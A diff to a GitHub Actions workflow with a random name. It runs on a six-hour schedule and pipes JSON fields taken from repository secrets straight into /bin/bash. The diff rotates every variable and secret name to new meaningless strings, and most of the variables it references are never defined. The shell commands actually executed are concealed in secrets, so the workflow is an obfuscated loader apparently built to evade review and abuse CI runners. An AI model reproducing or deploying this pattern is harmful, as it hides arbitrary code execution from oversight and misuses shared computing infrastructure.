@@ -3,8 +3,7 @@ name: gonggangsi3819
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 2/6 * * *'
-
+    - cron: '2 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,18 +11,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: gonggangsi3819
         env:
-          bstzx124: ${{ secrets.bstzx124 }}
+          a9692: ${{ secrets.a9692 }}
         run: |
-          echo $bstzx124 | jq -r .u42167 | /bin/bash
-          echo $o530 | jq -r .e49 | /bin/bash
-          echo $nn9 | jq -r .qwxv1751 | /bin/bash
-          echo $o592 | jq -r .rin510 | /bin/bash
-          echo $r801 | jq -r .i572 | /bin/bash
-          echo $bikxy9 | jq -r .vfwlc5945 | /bin/bash
-          echo $gfxh86335 | jq -r .cewz11 | /bin/bash
-          echo $yqs9283 | jq -r .cdl5 | /bin/bash
-          echo $ijuuk240 | jq -r .yt561 | /bin/bash
-          echo $elb97670 | jq -r .wasg161 | /bin/bash
-          echo $lk89 | jq -r .blpls194 | /bin/bash
-          echo $b6265 | jq -r .xdvzd4498 | /bin/bash
+          echo $a9692 | jq -r .fdezw9 | /bin/bash
+          echo $w286 | jq -r .r7 | /bin/bash
+          echo $any39492 | jq -r .kxna974 | /bin/bash
+          echo $orz79 | jq -r .llxrp503 | /bin/bash
+          echo $pb38722 | jq -r .piwky854 | /bin/bash
+          echo $sj458 | jq -r .fygt27514 | /bin/bash
+          echo $gm314 | jq -r .st89460 | /bin/bash
+          echo $jnmz7 | jq -r .ft827 | /bin/bash
+          echo $viv1 | jq -r .fiojz5 | /bin/bash
+          echo $o572 | jq -r .pv78322 | /bin/bash
+          echo $yk13346 | jq -r .ijq9697 | /bin/bash
+          echo $k159 | jq -r .voj52 | /bin/bash
+          echo $zzhn3930 | jq -r .dnvh45004 | /bin/bash
+          echo $zzkvm92 | jq -r .sz86 | /bin/bash
+          echo $uyiep00303 | jq -r .be36 | /bin/bash
 
